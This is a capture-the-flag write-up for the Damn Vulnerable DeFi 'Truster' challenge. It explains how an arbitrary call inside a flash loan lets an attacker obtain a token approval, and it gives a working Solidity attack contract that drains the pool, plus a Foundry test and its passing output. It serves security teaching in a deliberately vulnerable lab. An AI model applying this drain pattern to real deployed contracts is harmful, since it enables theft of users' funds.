# Challenge - Truster

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

## Objective of CTF

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## Vulnerability Analysis

### Root Cause: Arbitrary Call

```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool){
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```

In this `flashLoan` function, we observe that it allows us to execute an arbitrary external call within the `TrusterLenderPool` contract, as shown in the following code snippet:

```solidity
target.functionCall(data);
```

In this scenario, an attacker can execute a token approval to their address during the flash loan process. Although the `flashLoan` function ensures the borrowed amount is repaid, it doesn’t prevent the attacker from later using the `transferFrom` function to move tokens from the `TrusterLenderPool` contract, leading to a potential loss of funds.

### Attack steps:

1. Execute a flash loan and include data to approve a specific address to spend `TrusterLenderPool`'s tokens.
2. Use the approved address to transfer tokens from `TrusterLenderPool` to the `recovery`.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Ownable} from "solady/auth/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

interface TrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract AttackTrusterLenderPool is Ownable {
    uint256 private constant TOKENS_IN_POOL = 1_000_000e18;

    address private immutable pool;
    address private immutable token;
    address private immutable recovery;

    constructor(address _pool, address _token, address _recovery) {
        _initializeOwner(msg.sender);

        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external onlyOwner {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);

        // approve 1000000 ether token during the flashloan
        TrusterLenderPool(pool).flashLoan(0, address(this), token, data);
        // transfer all token from pool to recovery
        IERC20(token).transferFrom(pool, recovery, TOKENS_IN_POOL);
    }
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {AttackTrusterLenderPool} from "../../src/truster/AttackTrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the pool contract", token.balanceOf(address(pool)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery", token.balanceOf(address(recovery)), token.decimals()
        );

        AttackTrusterLenderPool maliciousContract = new AttackTrusterLenderPool(address(pool), address(token), recovery);
        maliciousContract.attack();

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "token balance in the pool contract", token.balanceOf(address(pool)), token.decimals()
        );
        emit log_named_decimal_uint(
            "token balance in the recovery", token.balanceOf(address(recovery)), token.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
```

### Test Result

```
Ran 2 tests for test/truster/Truster.t.sol:TrusterChallenge
[PASS] test_assertInitialState() (gas: 21997)
[PASS] test_truster() (gas: 420959)
Logs:
  -------------------------- Before exploit --------------------------
  token balance in the pool contract: 1000000.000000000000000000
  token balance in the recovery: 0.000000000000000000
  -------------------------- After exploit --------------------------
  token balance in the pool contract: 0.000000000000000000
  token balance in the recovery: 1000000.000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.10ms (310.00µs CPU time)

Ran 1 test suite in 256.57ms (6.10ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
